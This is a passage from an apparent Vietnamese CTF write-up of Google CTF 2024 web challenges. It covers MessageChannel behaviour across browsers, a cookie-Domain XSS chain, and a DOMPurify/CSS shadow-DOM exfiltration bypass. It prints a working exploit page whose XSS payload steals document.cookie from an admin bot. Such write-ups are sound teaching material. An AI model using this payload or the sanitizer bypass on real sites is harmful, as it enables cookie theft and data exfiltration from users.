</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>Ở đây thì sẽ chỉ có callback của <code>messageChannel.port1</code> là chạy, vậy thì nó sẽ giúp ích gì nhỉ? Đó là nếu như a.html đột nhiên bị redirect đến một origin khác trước khi <code>e.source.postMessage</code> của <code>b.html</code> kịp chạy, từ đó nơi mà data đến postMessage đến có thể là một trang do attacker dựng nên nhằm capture lại secret gì đó của user. TUY NHIÊN, giả thuyết này lại không đúng đối với google chrome, hãy xem ví dụ sau:</p>
<p>a.html:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">messageChannel</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">MessageChannel</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nx">messageChannel</span><span class="p">.</span><span class="nx">port1</span><span class="p">.</span><span class="nx">onmessage</span> <span class="o">=</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;recv from channel:&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">window</span><span class="p">.</span><span class="nx">onmessage</span> <span class="o">=</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;recv from window.onmessage:&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">win</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&#34;b.html&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">setTimeout</span><span class="p">(()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">win</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">(</span><span class="s2">&#34;aaa&#34;</span><span class="p">,</span> <span class="s2">&#34;*&#34;</span><span class="p">,</span> <span class="p">[</span><span class="nx">messageChannel</span><span class="p">.</span><span class="nx">port2</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="nb">window</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="s2">&#34;c.html&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span> <span class="mi">1000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>b.html:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">sleep</span> <span class="o">=</span> <span class="nx">d</span> <span class="p">=&gt;</span> <span class="k">new</span> <span class="nb">Promise</span><span class="p">(</span><span class="nx">r</span> <span class="p">=&gt;</span> <span class="nx">setTimeout</span><span class="p">(</span><span class="nx">r</span><span class="p">,</span> <span class="nx">d</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="nb">window</span><span class="p">.</span><span class="nx">onmessage</span> <span class="o">=</span> <span class="kr">async</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;message received, sending callback...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// e.ports[0].postMessage(&#34;aaa&#34;)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kr">await</span> <span class="nx">sleep</span><span class="p">(</span><span class="mi">10000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">e</span><span class="p">.</span><span class="nx">source</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">(</span><span class="s2">&#34;secret&#34;</span><span class="p">,</span> <span class="s2">&#34;*&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>c.html:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">window</span><span class="p">.</span><span class="nx">onmessage</span> <span class="o">=</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;secret captured: &#34;</span> <span class="o">+</span> <span class="nx">e</span><span class="p">.</span><span class="nx">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>Khi chạy ở Google Chrome:</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/79a594af-90e5-4b91-8547-d6e7339bfbd7" alt="image" />
    
  </figure>
</p>
<p>Có thể thấy rằng khi tab của a.html bị redirect, <code>e.source</code> ngay lập tức được gán <code>null</code></p>
<p>Khi chạy ở Firefox:</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/304f4287-e82c-4033-a030-4bad85b7f383" alt="image" />
    
  </figure>
</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/d3a62865-2c9d-4b66-a52b-e7e9115c5551" alt="image" />
    
  </figure>
</p>
<p>Điều xảy ra ở Chrome đã không giống với điều xảy ra ở firefox, thú vị đấy&hellip; Giờ thì ta đã hiểu vai trò của MessageChannel rồi</p>


<h3 class="relative group">shim.html 
    <div id="shimhtml" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#shimhtml" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>Hãy cùng nhìn vào <code>shim.html</code> của sbx origin</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/2ce3afa9-9c65-4b7e-bd0a-eaefc499c5a8" alt="image" />
    
  </figure>
</p>
<p>Cũng không hẳn là ta phải reverse đống này, ta chỉ cần chú ý vào cái message handler của nó thôi, đại khái là nó sẽ compare hash của data được postMessage đến và sau đó render nó bằng blob URL.</p>


<h3 class="relative group">password game 
    <div id="password-game" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#password-game" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>Ta nhanh chóng tìm được nhiều sink <code>innerHTML</code> được sử dụng</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/92145f54-fc52-42b7-90f1-c8061226ce5d" alt="image" />
    
  </figure>
</p>
<p>Trong đó có một nơi mà tainted data có thể flow từ source <code>document.cookie</code> (hoặc <code>localStorage</code>) đến sink <code>innerHTML</code>. Để có thể chèn được data vào Local Storage, ta sẽ cần XSS được sbx origin đó, nhìn lại cách mà game được sandbox thì thay vì bằng iframe như lần trước thì giờ đây nó là 1 window riêng biệt, ta sẽ không thể <code>win.frames[0].eval(...)</code> như lần trước được. Vậy thì làm sao đây? Ta vẫn còn <code>document.cookie</code>, và nếu như bạn đã quên thì ta có thể specify các thuộc tính cho cookie (như httponly, secure flag, &hellip;), một trong số đó là thuộc tính <code>Domain</code></p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/ff1b3759-cea8-41de-8c82-8a3709418335" alt="image" />
    
  </figure>
</p>
<p>Một subdomain sẽ có thể share cookie với một domain hoặc subdomain khác (<code>A.example.com</code> có thể share cookie với <code>B.A.example.com</code>)</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/168f832f-b751-4d18-8576-6670f6fe4c89" alt="image" />
    
  </figure>
</p>
<p>Để ý rằng tại <code>shim.html</code>, nếu ta dùng một origin có dạng <code>&lt;hash1&gt;-h641507400.0ta1gxvglkyjct11uf3lvr9g3b45whebmhcjklt106au2kgy3e-h641507400.scf.usercontent.goog</code>, với <code>hash1</code> sẽ là hash của payload của ta thì ta sẽ có thể thỏa điều kiện của hash check nhưng vẫn có thể XSS subdomain của sbx origin và set cookie với domain là <code>0ta1gxvglkyjct11uf3lvr9g3b45whebmhcjklt106au2kgy3e-h641507400.scf.usercontent.goog</code>. Như thế thì ta có thể lợi dụng XSS để set cookie <code>password=&lt;XSS&gt;</code> cho domain <code>0ta1gxvglkyjct11uf3lvr9g3b45whebmhcjklt106au2kgy3e-h641507400.scf.usercontent.goog</code> và trigger XSS một lần nữa nhằm lấy flag từ <code>localStorage</code>. Tuy nhiên có một điều hơi cấn, <code>correctPasswordSpan</code> sẽ không được insert vào DOM cho đến khi password được guess đúng.</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/5e4eb247-fd9e-4478-8f93-85f8543ea42f" alt="image" />
    
  </figure>
</p>
<p>Challenge này đã nhắc cho ta rằng element không cần thiết phải được insert vào DOM để có thể trigger XSS</p>


<h3 class="relative group">Firefox??? 
    <div id="firefox" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#firefox" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>Tới đây ta sẽ có <code>exploit.html</code> như sau (original exploit from <strong>@Terjang</strong>)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="c">&lt;!-- Import crypto functions from the challenge. --&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;https://game-arcade-web.2024.ctfcompetition.com/static/safe-frame.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="nx">passwordGameHash</span> <span class="o">=</span> <span class="s1">&#39;0ta1gxvglkyjct11uf3lvr9g3b45whebmhcjklt106au2kgy3e-h641507400.scf.usercontent.goog&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="nx">CHALL_URL</span> <span class="o">=</span> <span class="s1">&#39;https://game-arcade-web.2024.ctfcompetition.com/#1&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="nx">sleep</span> <span class="o">=</span> <span class="nx">d</span> <span class="p">=&gt;</span> <span class="k">new</span> <span class="nb">Promise</span><span class="p">(</span><span class="nx">r</span> <span class="p">=&gt;</span> <span class="nx">setTimeout</span><span class="p">(</span><span class="nx">r</span><span class="p">,</span> <span class="nx">d</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">      <span class="p">(</span><span class="kr">async</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">xss</span> <span class="o">=</span> <span class="nx">escape</span><span class="p">(</span><span class="sb">`xss&lt;img src onerror=&#34;opener.opener.postMessage({flag:document.cookie}, &#39;*&#39;)&#34;&gt;`</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// const xss = escape(`xss&lt;img src onerror=&#34;alert(1)&#34;&gt;`);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kr">const</span> <span class="nx">exploit</span> <span class="o">=</span> <span class="sb">`&lt;script&gt;document.cookie=&#34;password=</span><span class="si">${</span><span class="nx">xss</span><span class="si">}</span><span class="sb">;Domain=</span><span class="si">${</span><span class="nx">passwordGameHash</span><span class="si">}</span><span class="sb">;Path=/&#34;;alert(123);&lt;\/script&gt;`</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">hash</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">calculateHash</span><span class="p">(</span><span class="s1">&#39;google-ctf&#39;</span><span class="p">,</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="nx">origin</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">        <span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm">         * There is a bug that allows to execute on the same site as the password game.
</span></span></span><span class="line"><span class="cl"><span class="cm">         * Set an XSS inside a cookie and leak admin&#39;s cookie.
</span></span></span><span class="line"><span class="cl"><span class="cm">        */</span>
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">win</span> <span class="o">=</span> <span class="nx">open</span><span class="p">(</span><span class="sb">`http://</span><span class="si">${</span><span class="nx">hash</span><span class="si">}</span><span class="sb">-h641507400.</span><span class="si">${</span><span class="nx">passwordGameHash</span><span class="si">}</span><span class="sb">/google-ctf/shim.html?origin=</span><span class="si">${</span><span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">origin</span><span class="p">)</span><span class="si">}</span><span class="sb">&amp;cache=1`</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="kr">await</span> <span class="nx">sleep</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">        <span class="nx">win</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">({</span> <span class="nx">body</span><span class="o">:</span> <span class="nx">exploit</span><span class="p">,</span> <span class="nx">mimeType</span><span class="o">:</span> <span class="s1">&#39;text/html&#39;</span><span class="p">,</span> <span class="nx">salt</span><span class="o">:</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="p">},</span> <span class="s1">&#39;*&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1">// await sleep(3000);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">open</span><span class="p">(</span><span class="nx">CHALL_URL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nb">window</span><span class="p">.</span><span class="nx">onmessage</span> <span class="o">=</span> <span class="nx">e</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="k">if</span> <span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">data</span><span class="o">?</span><span class="p">.</span><span class="nx">flag</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nx">flag</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nx">location</span> <span class="o">=</span> <span class="s1">&#39;about:blank#&#39;</span> <span class="o">+</span> <span class="nx">e</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nx">flag</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;;&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">          <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">})();</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>Tuy nhiên nếu bạn chạy exploit này trên Chrome, flag sẽ không được trả về, đó là vì đối với blob origin, ta sẽ không thể set cookie được</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/c85bb834-c065-47a9-833a-094e82d9566c" alt="image" />
    
  </figure>
</p>
<p>Tuy nhiên đối với Firefox thì khác</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/e37b739b-57ba-464c-ad3e-4a3d6c962b77" alt="image" />
    
  </figure>
</p>
<p>Và khi report <code>exploit.html</code> cho bot thì ta sẽ có flag thông qua thông báo lỗi trả về</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/253ff2fc-d054-4e7f-b468-507b851566b3" alt="image" />
    
  </figure>
</p>


<h2 class="relative group">IN-THE-SHADOWS 
    <div id="in-the-shadows" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#in-the-shadows" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>Goal của bài là ta cần tìm cách truy cập được vào endpoint <code>check-secret</code> cùng với một admin secret hợp lệ nhằm có được flag. Ta thấy secret được render trong body, tuy nhiên admin secret thì chỉ được render nếu ta có được admin cookie hợp lệ</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/838d4472-c3cd-48c8-8248-942b4d7094c9" alt="image" />
    
  </figure>
</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/2297f97c-08c1-46c0-aff3-bea9025c830b" alt="image" />
    
  </figure>
</p>
<p>Ở bài này ta sẽ có thể nhập vào một nội dung bất kì, sau đó nội dung này sẽ được đưa vào một shadow DOM được attach với một custom element là <code>UntrustedContentElement</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">class</span> <span class="nx">UntrustedContentElement</span> <span class="kr">extends</span> <span class="nx">HTMLElement</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kr">static</span> <span class="nx">get</span> <span class="nx">observedAttributes</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">[</span><span class="s2">&#34;html&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nx">constructor</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kr">super</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="nx">_shadow</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">attachShadow</span><span class="p">({</span> <span class="nx">mode</span><span class="o">:</span> <span class="s2">&#34;closed&#34;</span> <span class="p">});</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nx">get</span> <span class="nx">html</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">getAttribute</span><span class="p">(</span><span class="s2">&#34;html&#34;</span><span class="p">)</span> <span class="o">??</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nx">set</span> <span class="nx">html</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="nx">setAttribute</span><span class="p">(</span><span class="s2">&#34;html&#34;</span><span class="p">,</span> <span class="nx">val</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nx">attributeChangedCallback</span><span class="p">(</span><span class="nx">name</span><span class="p">,</span> <span class="nx">oldValue</span><span class="p">,</span> <span class="nx">newValue</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">name</span> <span class="o">===</span> <span class="s2">&#34;html&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">this</span><span class="p">.</span><span class="nx">_shadow</span><span class="p">.</span><span class="nx">replaceChildren</span><span class="p">(</span><span class="nx">sanitize</span><span class="p">(</span><span class="nx">newValue</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">customElements</span><span class="p">.</span><span class="nx">define</span><span class="p">(</span><span class="s2">&#34;untrusted-content&#34;</span><span class="p">,</span> <span class="nx">UntrustedContentElement</span><span class="p">);</span>
</span></span></code></pre></div><p>Trước khi nội dung được đưa vào shadow DOM thì nó sẽ đi qua DOMPurify, config của DOMPurify như sau:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">DOMPURIFY_CONFIG</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">RETURN_DOM_FRAGMENT</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">FORCE_BODY</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">FORBID_ATTR</span><span class="o">:</span> <span class="p">[</span><span class="s2">&#34;name&#34;</span><span class="p">,</span> <span class="s2">&#34;id&#34;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">  <span class="nx">FORBID_TAGS</span><span class="o">:</span> <span class="p">[</span><span class="s2">&#34;template&#34;</span><span class="p">,</span> <span class="s2">&#34;svg&#34;</span><span class="p">,</span> <span class="s2">&#34;math&#34;</span><span class="p">,</span> <span class="s2">&#34;xmp&#34;</span><span class="p">,</span> <span class="s2">&#34;textarea&#34;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">  <span class="nx">USE_PROFILES</span><span class="o">:</span> <span class="p">{</span> <span class="nx">html</span><span class="o">:</span> <span class="kc">true</span> <span class="p">},</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span></code></pre></div><p>Ta có 2 phần cần chú ý:</p>
<ul>
<li><code>FORBID_ATTR: [&quot;name&quot;, &quot;id&quot;]</code> chặn các attribute như <code>id</code>, <code>name</code></li>
<li><code>FORBID_TAGS: [&quot;template&quot;, &quot;svg&quot;, &quot;math&quot;, &quot;xmp&quot;, &quot;textarea&quot;]</code> chặn các tag <code>template</code>, <code>svg</code>, <code>math</code>, <code>xmp</code>, <code>textarea</code>, hầu như là các tag dùng trong mutation XSS</li>
</ul>
<p>Đồng thời author cũng setup một hook cho DOMPurify để handle các <code>style</code> element:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">DOMPurify</span><span class="p">.</span><span class="nx">addHook</span><span class="p">(</span><span class="s2">&#34;uponSanitizeElement&#34;</span><span class="p">,</span> <span class="p">(</span><span class="nx">node</span><span class="p">,</span> <span class="nx">data</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">tagName</span> <span class="o">===</span> <span class="s2">&#34;style&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">node</span><span class="p">.</span><span class="nx">textContent</span> <span class="o">=</span> <span class="nx">sanitizeStyleSheet</span><span class="p">(</span><span class="nx">node</span><span class="p">.</span><span class="nx">textContent</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">});</span>
</span></span></code></pre></div><p>Đối với <code>style</code> element thì:</p>
<ul>
<li>không được chứa <code>@import</code> hoặc <code>url(</code></li>
<li>Sau khi parser bằng <code>CSSStyleSheet</code>, không được dùng các rules: import, media, font face, @layer, &hellip;</li>
<li>Trong phần selector của rule không được sử dụng <code>:</code></li>
</ul>
<p>Ở bài này thì mình thấy có khá nhiều hướng giải, mình sẽ trình bày về 1 hướng unintended và hướng intended</p>


<h3 class="relative group">Unintended - lazy loading 
    <div id="unintended---lazy-loading" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#unintended---lazy-loading" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>Trước khi nhìn vào writeup thì đây cũng là hướng mình dùng, ta có thể chèn tag <code>img</code> vào, cho nó lazy load, ẩn nó đi với <code>style=&quot;display: none&quot;</code> và khi một rule dùng để exfiltrate thỏa điều kiện, ta sẽ set lại style cho <code>img</code> đó thành <code>display: block !important</code>. Vậy làm sao để select đến <code>body</code> từ bên trong shadow DOM? Ta có thể dùng <code>:host-context</code> (<a href="https://developer.mozilla.org/en-US/docs/Web/CSS/:host-context" target="_blank">https://developer.mozilla.org/en-US/docs/Web/CSS/:host-context</a>) để select đến tag <code>body</code> và exfiltrate từ từ bằng cách filter theo attribute (<code>:host-context(body[secret^=&quot;0&quot;])</code>), nhưng có một vấn đề đó là ta sẽ không thể dùng dấu <code>:</code> trong selector. Theo như solution của <strong>@rebane2001</strong>, khi dùng <code>@scope(:host-context(body[secret^=&quot;0&quot;]))</code> thì <code>rule.selectorText</code> sẽ là <code>undefined</code></p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/98b83fd5-bf2c-4d85-87d7-1b79c7071f3a" alt="image" />
    
  </figure>
</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/73034a57-bf9a-4748-88ba-01ef6499dea2" alt="image" />
    
  </figure>
</p>
<p>Từ đó ta bypass được hàm <code>shouldDeleteRule</code>, exploit sẽ như sau:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">style</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nc">hide</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">display</span><span class="p">:</span> <span class="kc">none</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
